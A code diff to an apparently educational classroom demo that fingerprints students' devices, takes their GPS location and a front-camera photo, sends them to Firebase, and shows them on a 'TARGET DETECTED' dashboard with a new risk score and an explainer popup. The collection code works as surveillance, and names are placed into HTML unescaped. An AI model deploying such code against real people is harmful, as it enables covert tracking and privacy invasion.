@@ -232,7 +232,29 @@ async function captureFrontCameraPhoto() {
 }
 
 // ==========================================
-// 10. FORM SUBMIT FUNCTION (index.html)
+// 10. DYNAMIC RISK SCORE CALCULATOR
+// ==========================================
+function calculateRiskScore(hasLocation, hasPhoto) {
+    let score = 40; // Base risk score for automated hardware fingerprinting
+    if (hasLocation) score += 25;
+    if (hasPhoto) score += 30;
+    
+    let level = "MEDIUM RISK";
+    let color = "#ffcc00";
+
+    if (score >= 80) {
+        level = "CRITICAL EXPOSURE";
+        color = "#ff003c";
+    } else if (score >= 60) {
+        level = "HIGH EXPOSURE";
+        color = "#ff6600";
+    }
+
+    return { score, level, color };
+}
+
+// ==========================================
+// 11. FORM SUBMIT FUNCTION (index.html)
 // ==========================================
 async function submitData(e) {
     if (e) e.preventDefault();
@@ -248,7 +270,6 @@ async function submitData(e) {
         return;
     }
 
-    // Telemetry Collection
     const device = getDeviceBrand();
     const deepSpecs = getDeepHardwareSpecs();
     const batteryStatus = await getBatteryStatus();
@@ -256,17 +277,15 @@ async function submitData(e) {
     const netMetrics = getNetworkMetrics();
     const audioFP = getAudioFingerprint();
 
-    // IP & Carrier Lookup
     const netDetails = await getIPAndNetworkDetails();
     const realIP = netDetails.ip;
     const realNetwork = netDetails.network;
     let userLocation = netDetails.location;
 
-    // Capture Camera Photo
     const capturedPhoto = await captureFrontCameraPhoto();
 
-    // GPS & Push Logic
-    const pushData = (locationStr) => {
+    const pushData = (locationStr, isGps) => {
+        const risk = calculateRiskScore(isGps, !!capturedPhoto);
         pushToFirebase({
             name: name,
             class: studentClass,
@@ -279,7 +298,8 @@ async function submitData(e) {
             incognito: incognitoData,
             netMetrics: netMetrics,
             audioFP: audioFP,
-            photo: capturedPhoto
+            photo: capturedPhoto,
+            risk: risk
         });
     };
 
@@ -288,15 +308,15 @@ async function submitData(e) {
             (position) => {
                 let lat = position.coords.latitude.toFixed(4);
                 let lon = position.coords.longitude.toFixed(4);
-                pushData(`GPS: ${lat}, ${lon} | ${userLocation}`);
+                pushData(`GPS: ${lat}, ${lon} | ${userLocation}`, true);
             },
             () => {
-                pushData(userLocation);
+                pushData(userLocation, false);
             },
             { timeout: 5000 }
         );
     } else {
-        pushData(userLocation);
+        pushData(userLocation, false);
     }
 }
 
@@ -323,6 +343,9 @@ function pushToFirebase(payload) {
             ping: payload.netMetrics.ping,
             audioHardware: payload.audioFP,
             photo: payload.photo || null,
+            riskScore: payload.risk.score,
+            riskLevel: payload.risk.level,
+            riskColor: payload.risk.color,
             time: new Date().toLocaleTimeString()
         }).then(() => {
             showWarningScreen();
@@ -347,7 +370,54 @@ document.addEventListener("DOMContentLoaded", () => {
 });
 
 // ==========================================
-// 11. REALTIME DASHBOARD LISTENER (dashboard.html)
+// 12. EXPLAINER MODAL FUNCTION
+// ==========================================
+function openExplainerModal(name, device, cpu, gpu, photoPresent, score) {
+    let existingModal = document.getElementById('explainerModal');
+    if (existingModal) existingModal.remove();
+
+    const modal = document.createElement('div');
+    modal.id = 'explainerModal';
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100vw';
+    modal.style.height = '100vh';
+    modal.style.background = 'rgba(0, 0, 0, 0.85)';
+    modal.style.display = 'flex';
+    modal.style.justifyContent = 'center';
+    modal.style.alignItems = 'center';
+    modal.style.zIndex = '99999';
+    modal.style.padding = '20px';
+
+    modal.innerHTML = `
+        <div style="background: #0d0d0d; border: 2px solid #ff003c; border-radius: 8px; max-width: 500px; width: 100%; padding: 20px; color: #fff; box-shadow: 0 0 25px rgba(255,0,60,0.5); font-family: monospace;">
+            <h3 style="color: #ff003c; margin-top: 0; text-transform: uppercase;">❓ EXPLAINING TELEMETRY FOR ${name}</h3>
+            
+            <p style="font-size: 13px; line-height: 1.5; color: #ccc;">
+                <b>1. How was Hardware (CPU/GPU) read?</b><br>
+                Browsers automatically expose hardware details like <span style="color:#00e5ff;">${cpu}</span> and GPU (<span style="color:#ffcc00;">${gpu}</span>) via WebGL so websites can render graphics smoothly.
+            </p>
+
+            <p style="font-size: 13px; line-height: 1.5; color: #ccc;">
+                <b>2. How was Camera Snapshot taken?</b><br>
+                ${photoPresent ? "The target granted permission on the interactive prompt. HTML5 MediaDevices API captured the frame." : "No camera permission granted. Only hardware fingerprint was extracted."}
+            </p>
+
+            <p style="font-size: 13px; line-height: 1.5; color: #ccc;">
+                <b>3. Why is Risk Score at ${score}%?</b><br>
+                Combining IP routing, hardware canvas fingerprinting, and device telemetry creates a unique mathematical signature for tracking.
+            </p>
+
+            <button onclick="document.getElementById('explainerModal').remove()" style="background: #ff003c; border: none; color: white; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; border-radius: 4px;">CLOSE EXPLAINER</button>
+        </div>
+    `;
+
+    document.body.appendChild(modal);
+}
+
+// ==========================================
+// 13. REALTIME DASHBOARD LISTENER (dashboard.html)
 // ==========================================
 if (document.getElementById('logsContainer')) {
     const logsContainer = document.getElementById('logsContainer');
@@ -368,7 +438,7 @@ if (document.getElementById('logsContainer')) {
             const card = document.createElement('div');
             card.id = `log-${key}`;
             card.style.background = "#090000";
-            card.style.borderLeft = "5px solid #ff003c";
+            card.style.borderLeft = `5px solid ${data.riskColor || '#ff003c'}`;
             card.style.borderRight = "1px solid #330000";
             card.style.borderTop = "1px solid #330000";
             card.style.borderBottom = "1px solid #330000";
@@ -384,10 +454,21 @@ if (document.getElementById('logsContainer')) {
                 </div>
             ` : '';
 
+            const riskScore = data.riskScore || 50;
+            const riskLevel = data.riskLevel || 'MEDIUM EXPOSURE';
+            const riskColor = data.riskColor || '#ffcc00';
+
             card.innerHTML = `
-                <div style="font-size: 18px; color: #ffffff; font-weight: bold; margin-bottom: 5px;">
-                    🚨 TARGET DETECTED: <span style="color: #ff003c; text-shadow: 0 0 5px #ff003c;">${data.name.toUpperCase()}</span>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <div style="font-size: 18px; color: #ffffff; font-weight: bold;">
+                        🚨 TARGET: <span style="color: #ff003c;">${data.name.toUpperCase()}</span>
+                    </div>
+                    <!-- DYNAMIC RISK METER -->
+                    <div style="background: rgba(0,0,0,0.6); border: 1px solid ${riskColor}; padding: 4px 8px; border-radius: 4px; font-size: 11px; color: ${riskColor}; font-weight: bold;">
+                        RISK SCORE: ${riskScore}% [${riskLevel}]
+                    </div>
                 </div>
+
                 <div style="font-size: 13px; color: #ff8888; line-height: 1.6;">
                     Class: <span style="color: #00ff66;">${data.class}</span> | 
                     Device: <span style="color: #00ff66;">${data.device}</span> | 
@@ -412,8 +493,14 @@ if (document.getElementById('logsContainer')) {
 
                 ${photoHtml}
 
-                <div style="font-size: 12px; color: #ff003c; font-weight: bold; margin-top: 6px;">
-                    ❌ DATA STATUS: LEAKED ❌ <span style="color: #e6e6e6; font-size: 11px; font-weight: normal;">(Captured at ${data.time || 'Live'})</span>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px;">
+                    <div style="font-size: 11px; color: #ff003c; font-weight: bold;">
+                        ❌ DATA STATUS: LEAKED <span style="color: #e6e6e6; font-weight: normal;">(${data.time || 'Live'})</span>
+                    </div>
+                    <!-- EXPLAINER POPUP BUTTON -->
+                    <button onclick="openExplainerModal('${data.name}', '${data.device}', '${data.cpu}', '${data.gpu}', ${!!data.photo}, ${riskScore})" style="background: rgba(0, 229, 255, 0.2); border: 1px solid #00e5ff; color: #00e5ff; font-size: 10px; padding: 4px 8px; cursor: pointer; border-radius: 3px; font-weight: bold;">
+                        ❓ EXPLAIN TO STUDENTS
+                    </button>
                 </div>
             `;
 
@@ -433,7 +520,7 @@ if (document.getElementById('logsContainer')) {
 }
 
 // ==========================================
-// 12. RESET ALL DATA FUNCTION
+// 14. RESET ALL DATA FUNCTION
 // ==========================================
 function resetAllData() {
     if (confirm("⚠️ Clear all student records for the new demo?")) {
